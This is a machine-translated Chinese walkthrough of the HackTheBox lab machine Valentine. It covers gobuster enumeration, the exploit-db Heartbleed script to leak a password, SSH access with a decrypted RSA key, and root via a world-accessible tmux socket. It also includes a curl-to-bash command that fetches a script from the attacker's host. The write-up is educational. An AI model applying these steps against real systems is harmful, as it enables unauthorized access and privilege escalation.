# 情人节——令人心碎的黑客盒子演练

> 原文：<https://infosecwriteups.com/valentine-a-heartbleed-hackthebox-walk-through-d16a514bf1eb?source=collection_archive---------1----------------------->

![](img/407f2acba0869556d35e48cbd1d72354.png)

世界上流血的心联合起来

我在 5 月份完成了《情人节》,但它最近退役了，所以我想我应该写一篇关于我如何扎根于这个盒子的文章。

# 摘要

Valentine 是一台运行 web 服务的 Linux 机器，很容易受到心脏出血的攻击。该漏洞被利用来获取从内存中转储的密码。该密码与在 web 目录中找到的加密 RSA 密钥相结合，以获得主机上的 SSH 访问权限。从那里，以 root 用户身份运行的进程被访问，以获得具有提升权限的交互式 shell。

# 侦察

我像往常一样用一个`nmap -sV -sC`扫描来枚举服务版本并运行默认脚本:

nmap

我可以看到 SSH 是打开的，在 80 和 443 上运行着 web 服务。当我访问每个 web 服务时，它们都返回相同的主页，没有源代码中列出的超链接或目录。这些服务都返回了表明 Ubuntu 主机的操作系统信息。

然后，我继续用 gobuster 枚举 web 目录:

```
gobuster -k -u [https://10.10.10.79](https://10.10.10.79) -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

gobuster

> `-k`忽略 SSL 证书(否则自签名证书会抛出错误)
> `-u`指定 URL
> `-w`指定单词列表

从这里，我去了`/dev`目录，至少看看那里有什么。我找到了两个文件:`hype_key`和`notes.txt`。

notes.txt

另一个文件`hype_key`，看起来像一堆十六进制值。我用 curl 把它放到一个文件中，它看起来像这样:

```
curl -k [https://10.10.10.79/dev/hype_key](https://10.10.10.79/dev/hype_key) > hype_key
```

炒作 _ 关键

我能够将它放入 Burpsuite 中，并将其从 ASCII 十六进制解码为明文，这是一个加密的 RSA 密钥，其主体格式很差:

相当混乱

好的，我们知道这里的*应该看起来像一个 RSA 密钥。但是有许多额外的空格字符使它看起来超级棒。我决定用 python 来转换文件，只用几行就去掉了空格字符。*

用 python 清理 hype_key

最终产品看起来完全符合预期！

现在这样好多了

太好了！但是如果没有密码，这把钥匙就没什么用了。所以我不得不回到服务器上找点别的东西戳戳。在`/encode`和`/decode`目录下的页面看起来是简单的 base64 转换器。页面上看不到源代码，也没有链接到页面上的任何其他内容，所以我觉得这不是一个值得掉进的兔子洞。

# 剥削

主页上的 [**Heartbleed 标志**](http://heartbleed.com) 是这个盒子的重要暗示。由于我在机器上没有找到太多其他的东西，我运行了一个 searchsploit，发现有几个漏洞利用脚本和一些 metasploit 模块可用于此。其中一个对我很有效的标题是“OpenSSL TLS heart beat Extension—‘heart bleed’内存泄漏”。在 kali 中，文件名位于`/usr/share/exploitdb/exploits/multiple/remote/32745.py`

```
./32745.py 10.10.10.79
```

心脏出血

当机器接收到更多的流量时，这个漏洞就变得非常混乱。在它退役后，我重新访问了它以运行对要点的利用，内存转储中唯一的东西正是我所需要的。然而，随着其他流量冲击服务器，我不得不多次运行该漏洞，以获得正确的信息进行转储。总之，我需要的是:

```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

这被传递到`/decode.php`中，因此我们可以尝试对其进行 base64 解码:

```
echo aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -d
```

这将返回字符串`heartbleedbelievethehype`，我们可以尝试使用它来解密 RSA 密钥:

```
openssl rsa -in python.key -out new.key
```

出现提示时，输入密码，一个新的 RSA 密钥被写入一个名为`new.key`的文件中！我们可以用这个密钥 SSH 到 Valentine…但是用户是什么？这一步只是盲目猜测，但最终我根据密钥和密码猜测出了用户`hype`的以下命令:

```
ssh hype@10.10.10.79 -i new.key
```

我被录取了！我可以从这里拿到`user.txt`旗。

# 权限提升

从这里开始，我对 Linux 主机进行了典型的枚举。我运行 [LinEnum.sh](https://github.com/rebootuser/LinEnum) 并开始检查输出，以获得更多关于主机上正在发生什么以及我可以访问什么的上下文信息。

我最喜欢的运行方式是将这个 bash 脚本放在 Kali 的一个目录中，并使用 python SimpleHTTPServer 托管它:

```
python -m SimpleHTTPServer 80
```

然后，在远程机器上，打开脚本并将其直接传送到 bash:

```
curl http://X.X.X.X/Linenum.sh | bash
```

主机上没有写入文件！

不管怎样，尽管返回了很多，我还是不能用这个脚本直接*识别我的 privesc 路径。我不得不把手弄脏，手动绕着主机爬。根目录下有一个隐藏的`.dev`文件夹。这引起了我的注意，我在其中发现了一个名为`dev_sess`的文件，该文件归`root`所有，但每个人都可以执行。*

在`dev_sess`上运行`file`命令返回它是一个“套接字”。过了一会儿，我发现程序`tmux`可以连接到这些文件并返回交互式外壳！让我们试一试:

```
tmux -S /.devs/dev_sess
```

果然，这返回了一个以 root 身份运行的 shell！游戏结束。